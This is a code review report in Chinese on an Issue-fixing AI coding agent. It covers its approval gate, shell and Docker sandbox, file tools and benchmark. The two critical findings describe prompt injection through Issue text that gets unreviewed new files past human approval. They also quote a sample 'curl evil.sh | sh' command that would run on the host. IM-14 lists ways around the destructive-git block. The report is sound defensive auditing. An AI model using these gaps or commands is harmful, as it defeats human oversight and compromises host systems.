# 全量代码审查报告

> 审查日期：2026-08-30。基线：main @ 69554cd（171 commits）。
> 范围：全部产品代码约 5400 行（agent/ tools/ benchmark/ main.py scripts/）+ 测试套件（25 文件 / 382 测试函数 / 约 6100 行）+ Docker 配置（Dockerfile / docker/langfuse/docker-compose.yml / .env.example / .dockerignore）+ pyproject.toml。
> 方法：三路并行深度审查（Agent 核心 / 工具层 / 评测+测试+部署），关键疑点均以代码走读或实测复现验证（行尾改写、拦截绕过形态、`os.makedirs("")` 异常等均经实际执行确认）；标注"有意设计"处均有代码注释背书。
> 配套文档：《[项目全景梳理](2026-08-30-project-overview.md)》《[技术栈与部署指南](2026-08-30-tech-stack-and-deployment.md)》。

---

## 一、总体结论

| 维度 | 评价 |
|------|------|
| 架构清晰度 | **高**。阶段图显式、节点职责单一、降级/门禁/证据三类失败语义在注释中被自觉区分，读代码基本等于读设计文档；大量注释携带"事故→决策"锚点（rich#3299、arknights#4、dateutil#1545），后人可判断取舍是否仍成立 |
| 健壮性 | **良好（主链路）/ 存在系统性支路盲区**。LLM 故障降级、工具异常转观察值、审批防重放经实战打磨可靠；但 Windows 行尾、超时上界、测试基础设施失败静默等"本机测试通过、真实任务必踩"的问题仍存 |
| 安全性 | **一处实质缺口（CR-1）+ 一个威胁模型自相矛盾（CR-2）**。文件/命令层边界设计（统一路径守门、argv 传参、凭据不出宿主、沙箱六维限制）层次清晰，但未跟踪文件绕过人工审批直达 PR 直接削弱 W8 门禁有效性 |
| 可维护性 | **优秀**。模块划分清楚、注释密度高且记录"为什么"、台账式溯源；结构性瑕疵仅 approval.py 对 agent 层的反向依赖一处 |

**合计：2 Critical / 18 Important / 35 Minor**（Minor 节选自三路审查，全列见第四节）。测试套件 395 passed / 4 skipped，断言质量实质（详见第五节）。

---

## 二、Critical（合并前必须处理）

### CR-1 未跟踪（新建）文件绕过整套 diff → Review → 审批 → 漂移检查直达 PR，人工审批门禁被绕过

**证据链**（两路审查独立发现，交叉证实）：

- `agent/issue.py:398`：审批 diff 取自 `git_diff_since`；`tools/github_tools.py:122-124` 即 `git diff <base>`——按 git 语义**不含未跟踪文件**。
- `tools/github_tools.py:129`：`commit_changes` 用 `git add -A` 全量暂存——approve 后 untracked 文件被**静默提交**进 PR。
- `tools/approval.py:145-150`：漂移检查重算同一个 `git_diff_since`——产单后对新建文件内容的**任何篡改，sha256 漂移检查都发现不了**。
- Reviewer 侧同盲区：`agent/issue.py` 的审查输入复用同一 diff，Reviewer 只能从工作树事实清单看到新增文件**文件名**，看不到内容。
- 团队已知悉此盲区但只堵了子集：`agent/issue.py:235-237`（Arch-C2 注释）承认"git diff 不含未跟踪文件、随 approve 被提交"，`tools/approval.py:152-163` 只对**命中红线模式**的 untracked 文件"存在即拒绝"。

**危害**：Agent 用 `write_file` 新建文件是修复 feature 类 Issue 的常态路径而非边缘。结合 AGENTS.md 第八节"Issue 内容属不可信输入"的威胁模型，被注入的 Issue 可诱导 Agent 写入人工从未见过的新文件（如 `.github/workflows/*.yml` 随 PR 触发 CI）并进入公开 PR；产单停等期间对新建文件的篡改也无任何防护。

**建议修法**：审批单生成时用 `git status --porcelain` 收集 untracked 清单，将新文件内容内联进审批单 `diff` 字段与 sha256 指纹；`approve` 在 `git add -A` 前对 untracked 清单做二次校验（新增文件清单不一致即拒绝）。

### CR-2 默认 local 执行器下，不可信 Issue 内容可驱动宿主任意 shell 命令（威胁模型自相矛盾）

**证据链**：

- `agent/issue.py:384-385`：Issue title/body **原样拼接**进 prompt，无分隔/中立化处理。
- `tools/shell_tools.py:258` 与 `tools/docker_sandbox.py:268`：`KA_EXECUTOR` 缺省即 **local**——`subprocess.Popen(shell=True)` 直达宿主。
- `main.py:121-134`：`--issue` 模式未强制 docker，也无任何警示。
- `tools/shell_tools.py:42-43` 破坏性 git 拦截注释自述"本护栏防 Agent 自伤而非对抗安全边界（**沙箱负责隔离**）"——但在默认 local 模式下沙箱并不存在。

**危害**：恶意 Issue 文本（"运行 curl evil.sh | sh"或注入指令篡改 Agent 行为）即获得宿主执行面，与项目自己声明的威胁模型（第八节：Issue/仓库/网络内容一律视为不可信）直接冲突。

**建议修法**：`--issue` 模式默认/强制 `KA_EXECUTOR=docker`，或在 local 模式下加显式确认横幅与文档警示；至少给 Issue 正文加指令隔离框架（明示"以下为待处理数据非指令"——judge.py 已有此实践，issue 主链路没有）。

---

## 三、Important（18 项，按主题分组）

### 审批与红线（W8 门禁有效性）

| # | 问题 | 证据 |
|---|------|------|
| IM-1 | `auto_approve_if_eligible` **不核验测试证据**，但审计注释写死"测试验证"——verify_rounds=0（decide 首轮即 LLM 故障）或三轮 verify 全 ToolError 时，只要 Reviewer 文本 PASS 就会自动推送 | `agent/issue.py:88-105`（判定仅四条件）、`agent/issue.py:102`（注释超范围） |
| IM-2 | 红线内容通道只检查 `+` 行——Agent 用 edit_file **整体删除** `generated_at` 行时 diff 只有 `-` 行，两条通道全不命中 | `agent/issue.py:267-269` |
| IM-3 | 测试基础设施失败被静默吞掉：run_tests 超时/执行器错误（ToolError）时 Reviewer 证据面**一个字都没有**（对比 total==0 两种形态都有专门事实行）；且图侧将其当"未通过"走触顶终态，把"测试没跑成"误报成"验证预算耗尽" | `agent/issue.py:289-290`、`agent/graph.py:404-411` |
| IM-4 | `--approve` 传裸相对路径时：push 已成功，`save_approval` 因 `os.makedirs("")` 抛 FileNotFoundError 崩溃，审批单停留 pending——审计记录与远端事实脱节 | `main.py:175`、`tools/approval.py:99-103`（已实测） |

### 沙箱与命令执行

| # | 问题 | 证据 |
|---|------|------|
| IM-5 | run_command 的 timeout **非硬上界**：二次 communicate 再超时后回退无超时的 `proc.stdout.read()`，快照与击杀间新生的孙进程可长期占住管道 → 整个 Agent 循环挂死；且 POSIX 分支只 kill 顶层 shell，子进程树成孤儿（与 docstring"终止整棵进程树"不符） | `tools/shell_tools.py:192-196, 95-97` |
| IM-6 | run_tests **忽略 pytest 退出码**：pytest 未安装/启动即崩时 stdout 无汇总行 → 返回 `passed=0 failed=0 total=0`，结构上与"无失败"无法区分，判定循环可能据此误判为绿 | `tools/shell_tools.py:219-228` |
| IM-7 | `DOCKER_CLI_TIMEOUT=300` 对 docker exec 一刀切：`KA_TEST_TIMEOUT_S>300` 时 docker CLI 先被杀 → ToolError 直接 raise（连"错误返回 ToolError"契约也未满足），容器内进程继续跑至自身超时（资源泄漏）；首次 docker build 超 300s 同误判 | `tools/docker_sandbox.py:33, 79-86, 185, 245` |
| IM-8 | `sandbox_executor` 嵌套复用判断用**原始字符串**比较 workspace_root——尾斜杠/相对路径/大小写差异即判不等 → 同名容器再次 `docker run` 名称冲突，内层上下文硬失败（可用性损害，不损数据） | `tools/docker_sandbox.py:271-273`（对照 101 行归一化） |
| IM-9 | `DockerExecutor.run_tests` 按 Executor 协议签名传 `workspace_root=None` 时 `os.path.abspath(None)` TypeError 裸崩，违背"错误返回 ToolError 不抛异常"契约（当前调用点均显式传参，属潜在边界） | `tools/docker_sandbox.py:241`、`tools/shell_tools.py:167` |

### 文件工具

| # | 问题 | 证据 |
|---|------|------|
| IM-10 | edit_file 在 Windows 上**把整文件行尾改写为 CRLF**（`read_text` 归一 `\n` + `write_text` 默认 `newline=None` 写 `os.linesep`）——LF 文件编辑一处后未触及的行全部被改写（对 `.gitattributes eol=lf` 仓库产生全文件 diff 噪声）；反向：CRLF 文件无法用含 `\r\n` 的 old_text 命中，LLM 会陷入重试循环（**均已实测复现**） | `tools/file_tools.py:233, 244` |
| IM-11 | `list_files` 对坏符号链接/竞态删除/权限拒绝直接 OSError 冒泡，违背模块"错误返回 ToolError"契约（`os.walk` onerror 未接入） | `tools/file_tools.py:78` |

### LLM 与循环

| # | 问题 | 证据 |
|---|------|------|
| IM-12 | LLM 返回**非法 tool arguments** 无任何恢复手段：`json.loads` 不捕获 JSONDecodeError，graph 路径一次格式错误即整个任务终止为 llm_error（更合理语义是作为 tool 观察值回注让模型重试）；arguments 为合法 JSON 但非 object 时 `args.get` AttributeError | `agent/llm.py:173` |
| IM-13 | `run_agent`（最小循环路径）**完全没有工具执行防护**，与 graph 路径不对称（graph 同型位置有 try/except，注释 Arch-C1）——list_files OSError 等直接击穿整任务 | `agent/loop.py:232` vs `agent/graph.py:326-331` |

### 拦截与解析

| # | 问题 | 证据 |
|---|------|------|
| IM-14 | 破坏性 git 拦截存在"已知漏拦"清单**之外**的绕过形态（全部实测）：换行分隔命令（`echo a\ngit reset --hard`，正则锚点不含换行且未开 re.M）直接 PASS——多行命令是 LLM 自然产出形态；防误报的剥引号把引号包裹的子命令本身删掉（`git "reset" --hard` PASS，护栏被自己的防误报机制绕过）；`git.exe` 前缀不命中；黑名单缺 `branch -D`、`worktree remove` | `tools/shell_tools.py:30-34, 45`（docstring 已声明"防自伤非对抗边界"为有意取舍，但上述四形态未记录在案） |
| IM-15 | code_parser **不识别 `async def`**——异步函数/方法及其 calls 全部遗漏且无 warning，对查询方表现为"未找到"（本项目自身全同步，但 W5 起处理任意 GitHub 仓库） | `tools/code_parser.py:107, 112-116` |
| IM-16 | knowledge_audit 对畸形 line_range（1 元素 list / dict）直接 IndexError/KeyError **中断整场审计**——同模块 `_norm` 已防同类 schema 漂移，此处漏防 | `tools/knowledge_audit.py:213`（docstring 自认真实数据有 schema 漂移） |
| IM-17 | `llm.chat` 的 Langfuse generation **从不写 input/output 消息**——Langfuse 里看不到任何对话内容，对调试 Agent 行为是重大观测缺口；若为隐私有意不传，代码无注释说明取舍 | `tools/tracing.py:62-76` + `agent/llm.py:143-158` |
| IM-18 | report_trace **SDK 路径**嵌套 span 重复计时（latency 直接累加，父子 span 双计）——ClickHouse 路径已用 max(end)-min(start) 修过并注释，SDK 路径（优先数据源）漏改，totals 偏大不可比 | `tools/report_trace.py:103-106` vs `195-197` |

---

## 四、Minor（35 项，按文件分组，一条一句）

**agent/loop.py**
- M1 回放 assistant 消息 `content` 恒置 None，丢弃模型伴随 tool_calls 的文本说明（graph 路径保留，两路径行为漂移）。（agent/loop.py:238 vs agent/graph.py:310）
- M2 最小循环无上下文压缩（graph 已有 G5），长任务消息无界增长——W1 定位使然，建议注释声明或复用 `_compact_messages`。（agent/loop.py:206）

**agent/graph.py**
- M3 无 tool_calls 时显式写 `"tool_calls": None` 键——部分严格 OpenAI 兼容实现（自建 vLLM）会拒绝显式 null，省略更稳。（agent/graph.py:310）
- M4 decide 先自增再判 `<=`，verify/reflect 回路的 decide 不受 iteration 上限约束——LLM decide 可达 max+3，返回 iteration_count 可超过上限（无死循环风险，verify_rounds 封顶 3），与文档"迭代上限 20"语义有漂移。（agent/graph.py:317, 401）
- M5 `_run_issue_setup_commands` 返回值整体丢弃且不经 `tool.execute` 埋点——setup 失败对 Agent/Reviewer/Langfuse 三方均不可见（"失败不中断"有意，"不可观测"不是）。（agent/graph.py:466-471）

**agent/issue.py**
- M6 重试判定仅 `review.startswith("FAIL")`——"结论：FAIL..."会被当作通过跳过重试（auto-approve 的 startswith("PASS") 同样不识别，兜底到人工门禁方向安全但重试机制失效）。（agent/issue.py:410-411）
- M7 `_is_red_line_path` 对每个变更文件单独跑一次 `git diff base -- <path>`，N+1 子进程，一次全量 diff 即可。（agent/issue.py:264）
- M8 porcelain 解析不处理带引号路径与 `R old -> new` 重命名行（仅影响 Reviewer 证据文本准确性）。（agent/issue.py:174-176）
- M9 `.git` 判定用 isdir，同文件另一处专门处理过 linked worktree 的 `.git` 为文件形态——口径不一致。（agent/issue.py:370 vs 156-164）

**agent/llm.py**
- M10 `resp.choices[0]` 无空 choices 守卫（内容过滤时部分端点返回空数组），IndexError 被上游当 llm_error 吞掉丢失真实原因。（agent/llm.py:165）
- M11 `record_usage(..., 0.0)` 成本恒 0——W7 目标含 Cost，当前只有 token 数（已知缺口，llm.py 侧无 TODO 锚点）。（agent/llm.py:165）

**agent/correct.py**
- M12 `WIKI_LAYOUT` 常量定义后从未使用（死代码）；run_audit 把同样路径硬编码第二遍。（agent/correct.py:22, 41-42）
- M13 `stories` 目录不校验存在——缺失时整份报告显示 0% reliable（误导性结果而非显式失败）。（agent/correct.py:42）
- M14 报告文件名精确到秒，同秒两次运行互相覆盖（approval.py 同类问题已加随机后缀，此处未对齐）。（agent/correct.py:88-90）

**main.py**
- M15 `int(num)` 对畸形输入（`repo#abc`）抛 ValueError 无捕获；OpenAICompatClient 缺 Key ValueError 也裸 traceback 退出。（main.py:129, 249）
- M16 全模式成功失败均返回 0（review FAIL / 触顶 / llm_error 也是 0）——脚本化/CI 无法从退出码感知失败。（main.py 全文）
- M17 `--issue` 默认迭代上限 10 与 `IssueTask.max_iterations=20`、graph docstring"20"三处不一致——dataclass 默认永不生效，A12 预算切分随 10 轮计算。（main.py:36-37 vs agent/issue.py:59 vs agent/graph.py:252）

**tools/docker_sandbox.py**
- M18 非数值的 KA_SANDBOX_CPUS/PIDS 直接 float()/int() 崩溃（ValueError 而非 ToolError，与 shell_tools 容错风格不一致）。（tools/docker_sandbox.py:56,58）
- M19 直接 `with SandboxManager(...)` 使用时 create 在 `docker run -d` 成功后失败 → `__enter__` 抛出 → 容器泄漏（主路径 sandbox_executor 有 finally 兜底，独立使用无保护）。（tools/docker_sandbox.py:212-217）
- M20 容器硬化缺项：默认 root 运行（G7 注释已认）、无 `--cap-drop`/`--read-only`/`no-new-privileges`、tmpfs /tmp 无 size 上限。（tools/docker_sandbox.py:133-145）
- M21 `rel.startswith("..")` 判界会把 workspace 内 `..` 开头的合法目录名误判越界；退出码 124 判超时未注（命令自身合法退出 124 会误报）。（tools/docker_sandbox.py:177-178, 188）
- M22 `..cache` 类以点开头目录名误判（同 M21 判界），路径比较大小写不敏感平台未归一。

**tools/approval.py**
- M23 `from agent.issue import _red_line_patterns` 工具层反向依赖 agent 层（分层倒置）且审批执行时才 import，agent 包异常以 ImportError 裸崩——红线常量应下沉。（tools/approval.py:158）
- M24 `git ls-files` 非零退出时静默跳过未跟踪红线检查（fail-open，与"门禁失败必须显式报错"语义相悖）；分支名未做 ref-format 校验即拼入 `git push -u origin <branch>`（argv 传参无 shell，风险限于 git 选项）。（tools/approval.py:157, 134-137 + tools/github_tools.py:140）
- M25 save_approval 非原子写（无 temp+rename），中断产生损坏 JSON；decided_at 本地时间无时区。（tools/approval.py:100-102, 176）

**tools/github_tools.py**
- M26 get_issue/get_repository 直接下标取键，API 形状变化时 KeyError 而非 ToolError。（tools/github_tools.py:70-71, 81-82）

**tools/file_tools.py**
- M27 write_file 不拒绝 `.git/` 内路径（hook/config 可被改写；沙箱兜底下威胁有限，建议显式拒绝）；read_file 对 GBK 文件静默 replacement 无提示（edit_file 同场景正确拒绝）；search_code 结果无数量上限（大仓库命中上万行直接进 LLM 上下文，与 MAX_READ_SIZE 防护哲学不一致）；write_file 无内容大小上限。（tools/file_tools.py:195-208, 110, 157-177）
- M28 resolve 与后续 open 之间 TOCTOU 窗口（本地单 Agent 模型下可接受，记录在案）。（tools/file_tools.py:51-53）

**tools/knowledge_client.py**
- M29 未知 kind 静默按 entity 查询（查询语义静默偏移）；子进程 stderr 未重配 UTF-8，Windows 下错误信息可能 GBK 乱码。（tools/knowledge_client.py:76, 82-93）

**tools/knowledge_audit.py**
- M30 `[:80]` 截断只覆盖 events/concepts，characters/factions/locations 不截（不一致）；部分 read_text 无 `errors="replace"`（兄弟分支有）；event/timeline 的 `in_degree` 实为引用出度数，命名误导。（tools/knowledge_audit.py:62-86, 205, 267）

**tools/code_parser.py**
- M31 相对导入 level 信息丢失（`from . import x` 不计入 imports）；嵌套函数调用归入外层（docstring 已声明"简化静态分析"，有意设计）。（tools/code_parser.py:103-105, 82-88）

**tools/shell_tools.py**
- M32 git_diff 的 stat 与全量 diff 两次独立调用，之间工作树可变，可能不一致。（tools/shell_tools.py:386-392）

**tools/report_trace.py**
- M33 `_summarize_events` 11 列元组解包在 try 之外，schema 漂移时 ValueError 裸崩而非 TraceError；retry 指标双源累加（retry span +1 且根 span retry_count 再 +1）可能重复计数。（tools/report_trace.py:88, 160-162, 183-185）

**tools/tracing.py**
- M34 get_client 首次初始化无锁，多线程下可能重复建 client（观测层，影响低）。（tools/tracing.py:27-35）

**tools/docker_sandbox.py / runner.py**
- M35 `_repo_dir_name` 双 docstring，第一个被第二个覆盖（死代码）。（benchmark/runner.py:28-30）

---

## 五、benchmark 子系统专项审查（人工走读）

**架构**：loader（schema 逐键校验，含 bool 冒充 int 的精确拒绝）→ runner（单 case 单沙箱：repo 就绪 → case 级 setup_commands → **基线测试预检**（失败标 environment_error 与 Agent 能力分离，tokens/迭代仍如实计入）→ Agent → 判定）→ 双判定（must_pass 测试 + LLM Judge 功能等价 / 域案例规则检查器）→ report（raw/adjusted 双口径 + `--compare` 重算 adjusted 对比行）。`_run_one_case` 任何异常收敛为该 case 的 error 结果不中断其余 case——评测器本身工程质量良好。

**问题**（前 3 条较重要）：

| # | 级别 | 问题 | 证据 |
|---|------|------|------|
| BM-1 | Important | `check_deletions` 只对照**剩余数据**核验三判据，不对照 git HEAD 基线——若 Agent 同时删除条目 md 与引用它的记录，入度归零即判 PASS（"引用剥离"可绕过判定器）；`check_bridge` 有基线对比而 deletions 没有，口径不对称。人工审批是后盾，但判定器语义上可被绕过 | `benchmark/domain_checks.py:380-411`（docstring 自认"基于剩余数据"）vs `438-442` |
| BM-2 | Minor | domain 类 case 仍被 loader 要求提供 gold_patch 文件（校验对所有 case 生效；B9 修复只跳过 runner 读取）——补 domain 案例时须放 dummy 文件或改校验 | `benchmark/loader.py:79-82` |
| BM-3 | Minor | judge 首行正则 `^PASS` 与 issue.py 重试判定同源严格性："结论：PASS"不命中即判 FAIL，与 LLM 输出习惯存在误判面（与 IM-6/M6 同族） | `benchmark/judge.py:47` |
| BM-4 | Minor | `_load_work_tree`/`_load_git_head` 的 read_text 无 `errors="replace"`——非 UTF-8 数据文件将 UnicodeDecodeError 冒泡为 case error（knowledge_audit 同场景已加 replace） | `benchmark/domain_checks.py:324, 327` |
| BM-5 | Minor | `compare_reports._adjusted` 现场重算 adjusted 而不用 `report.resolution_rate_adjusted` 字段——口径双源，两处逻辑可能漂移；且该行格式异常（多余空格）但功能正确 | `benchmark/report.py:177-180` |
| BM-6 | Minor | 成本单价表空（已知用户项）且 prompt/completion 用同一单价（简化未注明）；`load_cases` docstring 说"递归扫描"实为两层（category 目录 + *.json） | `benchmark/runner.py:22-24, 33-38`、`loader.py:131-139` |

**值得肯定**：基线预检把环境缺口与 Agent 能力分离（environment_error 单列）；域判定器诚实三态（无法判定 SKIP 不做过度推断）且判据与 W5 审计定义对齐；git quotepath 八进制转义路径解析正确处理（中文文件名场景实测过）；案例 JSON 的逐键类型校验（含 bool 冒充 int 拒绝）是同类 loader 里少见的严谨。

---

## 六、测试套件评估

**规模与状态**：25 个测试文件 / 382 个测试函数（参数化后 395 项）；最新回归 **395 passed / 4 skipped / 0 failed**（skipped = docker 集成 + mcp/kg 条件跳过，按环境变量启用）。

**质量观察（正面）**：
- 断言行为而非实现：auto-approve 四个拒绝条件逐一有独立测试（deletions/review_fail/red_lines/eligible_pushes）；红线 git 故障冒泡、untracked 红线文件删除、上下文压缩截断、预算 nudge 触发、G8 reasoning_content 回放、setup_commands 顺序与 ToolError 形态均有直接测试。
- mock 边界清晰：Fake gh monkeypatch 不触网、FakeDocker seam 隔离引擎、git 写操作用本地临时仓库；docker/mcp/kg 集成测试显式标记条件跳过而非伪装单元测试。
- 覆盖分布合理：test_issue_agent(41) 与 test_graph(35) 两个最高风险模块测试最密。

**质量观察（缺口）**：
- **CR-1 的 untracked 提交链路零覆盖**：approve 时 `git add -A` 提交 untracked 的行为无测试（现有 untracked 测试只覆盖红线子集）。
- loop 路径防护缺失无测试固化（IM-11 对应）；"结论：FAIL"前缀变体无测试（IM-6/M6/BM-3 同族）。
- 已有教训在案：monkeypatch 测试曾掩盖两个接线缺陷（KA_TEST_TIMEOUT_S 未接执行器、G3 未传 workspace_root）——接缝测试需与接线测试成对。
- 环境性遗留：docker 集成 2 项依赖公网（pip six / Hello-World 克隆）易碎；B14 mount_sync 测试本轮 3 连败后自愈（待观测）；B13 setup 失败形态待专项验证。

---

## 七、Docker 部署配置评估

**Dockerfile（沙箱镜像）**：分层合理（apt 小包 + node tar 并行下载 + 清华 pip 源），pytz==2023.3 预装已修 W6 基线缺口，`core.filemode false` 处理 Windows/Linux 权限位差异。风险：python:3.12-slim **浮动 tag**、**pytest 未钉版**（v1 镜像；派生镜像 v1x 已钉 8.3.5）、fetch_node.py **无 sha256 校验**（仅总字节数核对）——均为 W3 已知遗留，重建镜像可能漂移。

**docker/langfuse/docker-compose.yml（观测栈）**：官方 v4 六容器拓扑，其余服务均绑 127.0.0.1，healthcheck 齐全。风险：`langfuse-web` 的 **3000 端口绑定全部接口**且全部 CHANGEME 项有弱默认值（SALT/ENCRYPTION_KEY/各密码）——带默认值暴露到非本机网络有实际风险，部署时必须逐项替换。

**.env.example**：批 4 修复后全配置面已文档化（17 个变量全部有注释），密钥零入库纪律良好。

---

## 八、值得肯定的设计点（合并三路审查）

1. **"事故→决策→注释"链完整**：几乎每处容错都引用真实事故锚点（arknights#4 的 50 轮超时、rich#3299 的 git stash 自伤、dateutil#1545 的 editable install），取舍可追溯可重审——同类项目少见。
2. **有损视图 + 无损状态的上下文压缩**（graph G5）：压缩只作用于送 LLM 的视图，state 全量保留，消息配对（tool_calls/tool 结果 id）与 reasoning_content 回传严格成立。
3. **审批工件的安全工程**：终态防重放、sha256 漂移检测、approval_id 字符白名单防路径穿越、B7 半失败语义（push 成功/PR 失败落 approved 终态拒绝重放）、untracked 红线纵深防御。
4. **Reviewer 证据面防幻觉设计**：diff 之外注入文件系统正交事实（变更/删除/新增清单、路径探针、红线还原、测试证据含异常形态），"空 diff + 有结论"转结论审查模式。
5. **单一守门人路径校验**：`resolve_workspace_path` 被全部文件/命令工具复用，`Path.resolve() + is_relative_to` 拦静态符号链接/`../`/盘符越界，cwd 越界有专门测试。
6. **Windows 踩坑深度**：进程树先快照枚举后代再杀（含"孤儿重挂 PID 4"注释）、全 subprocess 显式 UTF-8+errors=replace 系统性排除 GBK 一类 bug、沙箱创建期有网运行期断网的务实方案。
7. **评测器诚实性**：基线预检分离环境缺口与 Agent 能力、域判定器三态诚实 SKIP、双口径分母说明写在报告里。

---

## 九、修复优先级建议与待处理清单

### 9.1 修复优先级

1. **CR-1**（untracked 审批盲区）——人工审批是本项目最高风险操作的唯一门禁，建议立即修。
2. **CR-2**（local 执行器 + 不可信 Issue）——`--issue` 强制/默认 docker 或显式警示。
3. **IM-1 + IM-3**（条件自动放行的测试证据缺口——D1 刚上线，趁热补）。
4. **IM-10**（edit_file 行尾改写，真实任务路径必踩）。
5. **IM-5/6/7**（超时硬上界 / run_tests 退出码 / docker 300s 一刀切）。
6. 其余 Important 与 Minor 按窗口节奏清理；BM-1（deletions 基线对比）建议随 domain 案例补位一起做。

### 9.2 与既有台账的关系（重要：台账已部分过时）

`docs/analysis/2026-08-29-unfinished-ledger.md` 写于 08-29，其后的 commits（70397cf / 8e83562 / 69554cd）已关闭其中多项，**以代码为准的当前状态**：

- 已完成（台账仍标待办）：B7（push 成功建 PR 失败落终态）、B8（KA_SETUP_TIMEOUT_S）、B9（域 case 跳过 gold）、B10（md 转义）、**B11**（--compare adjusted 对比行）、**G4 决策**（total=0 口径可视化）、**G5**（上下文滚动压缩 + 43 轮实战复证）、**G7**（destroy 容器侧清理）、**D1**（条件自动放行 --auto-approve）、**A12**（预算 nudge 执行层 + 实战复证）、B12（A7-2 档案入 docs/analysis/2026-08-29-a7-brief-archive.md）、A13（处置为兄弟项目侧问题，已记录）。
- 仍有效未完项见 9.3。
- 本次审查新发现（不在任何台账）：CR-1 完整证据链、CR-2、IM-1 至 IM-18、BM-1 至 BM-6 的大部分。

### 9.3 未完结事项清单（当前有效）

**A. 产品代码（本次审查新发现，建议排期）**
- CR-1 untracked 文件审批盲区（最高优先）
- CR-2 --issue 模式 local 执行器与威胁模型矛盾
- IM-1 auto-approve 补测试证据核验条件（含注释与实现对齐）
- IM-2 红线删除行通道；IM-3 测试异常事实入 Reviewer 证据 + 终态语义区分；IM-4 裸相对路径 makedirs
- IM-5 run_command 超时硬上界与 POSIX 进程树；IM-6 run_tests 退出码；IM-7 docker exec 超时解耦
- IM-8 嵌套沙箱路径归一；IM-10 edit_file 行尾；IM-11 loop 防护对齐；IM-12 非法 arguments 恢复；IM-13 未记录绕过形态补 docstring；IM-14 SDK 路径重复计时；IM-15 async def；IM-16 line_range 防御；IM-17 generation 消息取舍注记；IM-18 list_files onerror
- BM-1 deletions 基线对比；BM-2 domain case gold 校验放宽

**B. 历轮确认未完（台账有效项）**
- A8/G4 余量：total=0 全绿即 pass 的语义已决策为"不翻转"，但 Reviewer 提示词对"0 收集"的强提示可再加压（低）
- A11 余量：root 属主残留 destroy 自动化已做，容器硬化项（cap-drop/read-only）未做（M20）
- B13：docker setup environment_error 失败形态专项验证
- B14：mount_sync 测试 flake 观测
- M6（台账编号）：approval_id 相关均清偿；_red_line_patterns 分层倒置（本次 M23）待下沉

**C. 用户项 / 排期项**
- C1 单价表 MODEL_PRICE_USD_PER_1K（待用户提供 mimo/deepseek 单价）
- C2 domain 类基准案例补位（可复用兄弟项目 Issue #4 题面）
- D2 知识纠错第二阶段 `--apply`（LLM 事实核查 → 删真死数据/补 bridge → 重建索引 → 写回）：**D1 已落地，冻结可解除，待排期**（action_type=knowledge_apply 通道已预留）
- D3 PR #3 处置（SilhouetteQA 审阅/合并决定）+ 剩余 3 条死数据候选续跑 + 兄弟项目 Issue #4 凭"保留 0 删除"结论关闭
- D4 模型策略：mimo 订阅周限 vs deepseek（G8 修复后 v4 已能完整通过，预算纪律仍弱于 mimo）——建议按任务类型分流
- 台账文件刷新（将 9.2 中已完成的 12 项标记关闭，并入本次审查新发现）
